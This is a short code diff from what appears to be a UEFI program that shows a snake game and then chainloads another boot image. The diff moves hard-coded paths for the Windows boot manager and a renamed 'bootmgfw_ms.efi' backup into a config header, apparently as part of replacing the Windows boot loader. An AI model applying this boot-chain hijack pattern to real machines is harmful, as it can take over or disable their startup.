@@ -5,9 +5,7 @@
 #include "bootlib.h"
 #include "ui.h"
 #include "snake_payload.h"
-
-char *OriginalLoader = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
-char *BackupLoader   = "\\EFI\\Microsoft\\Boot\\bootmgfw_ms.efi";
+#include "config.h"
 
 int main(int argc, char **argv) {
     BOOLEAN won = FALSE;
@@ -17,7 +15,7 @@ int main(int argc, char **argv) {
             won = TRUE;
     }
     displaySucces();
-    bootFile(IM, BackupLoader);
+    bootFile(IM, OriginalLoaderA);
 
     
     return 0;
